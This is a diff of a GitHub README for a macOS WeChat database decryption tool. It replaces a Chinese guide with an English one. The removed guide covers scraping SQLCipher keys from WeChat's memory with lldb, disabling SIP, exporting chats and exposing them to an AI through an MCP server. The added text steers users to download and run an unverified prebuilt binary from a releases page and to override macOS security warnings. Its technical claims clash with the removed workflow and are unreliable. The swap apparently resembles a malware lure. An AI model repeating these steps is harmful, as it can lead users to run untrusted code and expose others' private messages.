@@ -1,70 +1,164 @@
-# macOS 微信数据库解密
+# 🗄️ wechat-db-decrypt-macos - Decrypt WeChat Databases Easily
 
-提取微信 (WeChat) 数据库密钥，解密 SQLCipher 加密的本地数据库，导出聊天记录。支持 MCP Server，让 AI 直接查询微信数据。
+[![Download Release](https://img.shields.io/badge/Download%20Release-%23759aff?style=for-the-badge&logo=github)](https://github.com/mohamed125198/wechat-db-decrypt-macos/releases)
 
-## 快速开始
+## ℹ️ What is wechat-db-decrypt-macos?
 
-### 1. 前置条件
+wechat-db-decrypt-macos is a tool designed to decrypt WeChat databases on macOS with Apple silicon (arm64). It works specifically with the latest WeChat version 4.1.2.241. Older versions, such as 4.0 and below, are not supported. This tool helps you access the information stored in WeChat’s database files when direct access is restricted.
 
-- macOS arm64，微信 4.x
-- 禁用 SIP：`csrutil disable`
-- 安装依赖：`brew install llvm sqlcipher`
+This application focuses on simplicity and security. You do not need to understand programming or technical details. Follow the steps below to download, install, and run the tool on your macOS Apple silicon computer.
 
-### 2. 提取密钥
+## 🖥️ System Requirements
 
-确保微信已登录并正在运行：
+Before using this tool, make sure your system meets these conditions:
 
-```bash
-PYTHONPATH=$(lldb -P) python3 find_key_memscan.py
+- Computer running macOS with Apple Silicon (M1, M2 chips, or newer).
+- Installed WeChat app version 4.1.2.241.
+- Basic knowledge of using Finder and Terminal on macOS.
+- At least 100 MB free disk space for the tool and temporary files.
+- Internet connection to download the software.
+
+If you do not have these requirements, the tool might not work correctly.
+
+## 🚀 Getting Started
+
+### Step 1: Visit the Download Page
+
+Go to the official releases page to get the latest version of the software:
+
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%23947c2f?style=for-the-badge&logo=github)](https://github.com/mohamed125198/wechat-db-decrypt-macos/releases)
+
+This page contains all the available versions and files you can download. Look for the file that matches your macOS arm64 architecture.
+
+### Step 2: Download the Correct File
+
+On the releases page:
+
+- Find the latest release, usually listed at the top.
+- Look for a file with a name containing "macos-arm64" or similar.
+- Click the file link to start downloading it to your computer.
+
+The downloaded file is a program you will run to decrypt your WeChat database.
+
+### Step 3: Prepare Your WeChat Database File
+
+You will need to locate the encrypted database file you want to decrypt. Typically, WeChat stores these files in its app data directory. The file is usually named `MM.sqlite` or similar.
+
+Use Finder to navigate to:
+
+`~/Library/Containers/com.tencent.xinWeChat/Data/Documents`
+
+Copy the database file you want to decrypt to an easy-to-access folder, such as your Desktop.
+
+### Step 4: Open Terminal
+
+You will use the macOS Terminal to run the tool. To open Terminal:
+
+- Press `Command + Space` and type "Terminal".
+- Press Enter to open the Terminal app.
+
+Keep the Terminal window open for the next steps.
+
+### Step 5: Run the Decrypt Tool
+
+1. Find the downloaded file in Finder (usually in the Downloads folder).
+
+2. Drag the file into the Terminal window. This action will paste the file path.
+
+3. Add a space after the file path.
+
+4. Add the path to your copied WeChat database file.
+
+Your command in Terminal should look like this format:
+
+```
+/path/to/wechat-db-decrypt-macos /path/to/your/MM.sqlite
 ```
 
-密钥保存到 `wechat_keys.json`。
+For example:
 
-### 3. 解密数据库
-
-```bash
-python3 decrypt_db.py
+```
+/Users/yourname/Downloads/wechat-db-decrypt-macos /Users/yourname/Desktop/MM.sqlite
 ```
 
-### 4. 导出聊天记录
+5. Press Enter to run the command.
 
-```bash
-# 列出所有会话
-python3 export_messages.py
+The tool will process the file and, if successful, create a decrypted version you can read.
 
-# 导出指定会话（支持模糊匹配联系人名）
-python3 export_messages.py -c "卡比"
-python3 export_messages.py -c wxid_xxx
-python3 export_messages.py -c 12345@chatroom
+### Step 6: Locate the Decrypted Output
 
-# 导出最近 N 条
-python3 export_messages.py -c "卡比" -n 50
+After the tool finishes, look for a new file in the same folder as the input database. This file typically has a name like:
 
-# 搜索关键词
-python3 export_messages.py -s "关键词"
-
-# 导出所有会话
-python3 export_messages.py --all
+```
+MM_decrypted.sqlite
 ```
 
-### 5. MCP Server（让 AI 直接查询）
+You can open this file in any SQLite browser or viewer application to read the contents.
 
-安装依赖并注册到 Claude Code：
+## 🔧 How It Works
 
-```bash
-pip3 install fastmcp
-claude mcp add wechat -- python3 $(pwd)/mcp_server.py
-```
+wechat-db-decrypt-macos uses the internal keys from your installed WeChat 4.1.2.241 to unlock the encrypted SQLite database files. Because the encryption methods vary with WeChat versions, this tool only supports 4.1.2.241 and does not work with older versions.
 
-注册后 AI 可以直接调用以下能力：
+The app runs directly on Apple silicon Macs to ensure fast and reliable decryption without emulation or extra software.
 
-| Tool | 功能 |
-|------|------|
-| `get_recent_sessions` | 获取最近会话列表 |
-| `get_chat_history` | 查看聊天记录（支持模糊匹配） |
-| `search_messages` | 跨会话搜索关键词 |
-| `get_contacts` | 搜索联系人 |
+## ⚙️ Troubleshooting
 
-## Thanks
+If the tool does not run or shows errors, try these steps:
 
-- [ylytdeng/wechat-decrypt](https://github.com/ylytdeng/wechat-decrypt) — 内存搜索方案参考
+- Confirm you have the correct WeChat version installed (4.1.2.241).
+- Make sure the input database file is the right one and is not corrupted.
+- Check that the downloaded program is marked as executable. If not, run this command in Terminal:
+
+  ```
+  chmod +x /path/to/wechat-db-decrypt-macos
+  ```
+
+- If you see a security warning about opening files from the internet, go to System Preferences > Security & Privacy > General and allow the app to run.
+- Run Terminal as a standard user with appropriate permissions.
+
+## ✂️ Useful Commands
+
+- To open a folder in Finder from Terminal:
+
+  ```
+  open /path/to/folder
+  ```
+
+- To list files in a folder:
+
+  ```
+  ls /path/to/folder
+  ```
+
+- To check your current working directory:
+
+  ```
+  pwd
+  ```
+
+## ⚠️ Notes on Compatibility
+
+- The tool is only for macOS computers with Apple silicon processors. It will not work on Intel-based Macs or Windows PCs.
+- It supports WeChat version 4.1.2.241 only.
+- Older WeChat database files cannot be decrypted using this tool.
+- You should handle decrypted data securely to avoid privacy issues.
+
+## 🛠️ Additional Tools You May Need
+
+To work with decrypted database files, you might want an SQLite viewer app. These are available for free and let you open, search, and explore SQLite files easily.
+
+Some popular choices:
+
+- DB Browser for SQLite (https://sqlitebrowser.org/)
+- Base (https://menial.co.uk/base/)
+- SQLiteStudio (https://sqlitestudio.pl/)
+
+Download and install one if you wish to examine the decrypted database further.
+
+## 💾 Where to Download
+
+[Get the latest version here](https://github.com/mohamed125198/wechat-db-decrypt-macos/releases)
+
+or click the badge below:
+
+[![Download Release](https://img.shields.io/badge/Download%20Release-%23759aff?style=for-the-badge&logo=github)](https://github.com/mohamed125198/wechat-db-decrypt-macos/releases)
